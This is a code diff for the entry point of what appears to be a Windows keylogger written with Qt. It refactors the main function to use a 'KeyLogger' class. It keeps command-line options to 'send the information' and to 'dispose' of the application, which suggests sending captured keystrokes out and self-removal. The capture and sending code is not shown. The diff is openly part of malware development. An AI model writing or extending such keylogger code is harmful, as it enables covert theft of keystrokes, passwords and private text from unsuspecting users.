@@ -2,22 +2,16 @@
 #include <QCommandLineParser>
 #include <QCoreApplication>
 #include <QDebug>
-#include <QDir>
-#include <QStandardPaths>
 #include <QString>
 #include <QStringList>
 
-#include <iostream>
-#include <windows.h>
-
-static HHOOK hHook = nullptr;
-
-using namespace std;
+#include "constants.h"
+#include "keylogger.h"
 
 int main(int argc, char *argv[])
 {
     QCoreApplication app(argc, argv);
-    QCoreApplication::setApplicationVersion("0.0.1");
+    QCoreApplication::setApplicationVersion(SOFTWARE_VERSION);
 
     QCommandLineParser parser;
     parser.addHelpOption();
@@ -54,14 +48,14 @@ int main(int argc, char *argv[])
     parser.addOption(getIntervalOption);
 
     QCommandLineOption sendOption(
-        QStringList() << "s" << "send",
+        QStringList() << "send",
         QCoreApplication::translate("main", "Send the information.")
     );
 
     parser.addOption(sendOption);
 
     QCommandLineOption disposeOption(
-        QStringList() << "d" << "dispose",
+        QStringList() << "dispose",
         QCoreApplication::translate("main", "Dispose the application.")
     );
 
@@ -69,15 +63,12 @@ int main(int argc, char *argv[])
 
     parser.process(app);
 
-    QString outputPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation);
-    QDir outputDir = QDir(outputPath);
-    outputDir.cdUp();
+    QString outputHash;
+    outputHash = parser.value(setHashOption);
 
-    qDebug() << outputDir.absolutePath();
-
-    if (hHook == nullptr) {
-        return 1;
-    }
+    KeyLogger *keyLogger = new KeyLogger();
+    keyLogger->setOutputHash(outputHash);
+    qDebug() << keyLogger->getOutputHash();
 
     return app.exec();
 }
